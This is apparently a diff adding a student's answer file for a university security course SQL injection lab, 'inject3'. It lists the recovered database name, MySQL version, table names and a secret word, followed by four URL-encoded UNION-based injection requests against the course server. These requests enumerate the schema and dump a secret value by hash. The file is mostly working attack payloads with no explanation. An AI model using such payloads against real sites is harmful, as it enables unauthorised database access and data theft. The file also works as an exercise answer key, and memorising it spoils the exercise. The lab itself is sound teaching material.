@@ -1,0 +1,9 @@
+proj2_inject3
+5.5.55-0ubuntu0.14.04.1
+foo,inject3_users,SECRET,HINT
+foxtrot
+
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+UNION+ALL+SELECT+NULL%2Cdatabase%28%29%2CNULL%2CNULL+FROM+information_schema.schemata%3B%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+UNION+ALL+SELECT+NULL%2Cversion%28%29%2CNULL%2CNULL+FROM+information_schema.schemata%3B%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+UNION+ALL+SELECT+NULL%2Cconcat%28column_name%29%2CNULL%2CNULL+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME%3D%27SECRET%27+limit+0%2C1%3B%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+all+select+1%2Cconcat%28hash%2C0x3a%2Csecret%2C0x3a%29%2C3%2C4+from+SECRET+where+hash+%3D%2757e43d72ee3df6ee6e461be5e63428e5%27+limit+0%2C1%3B%23
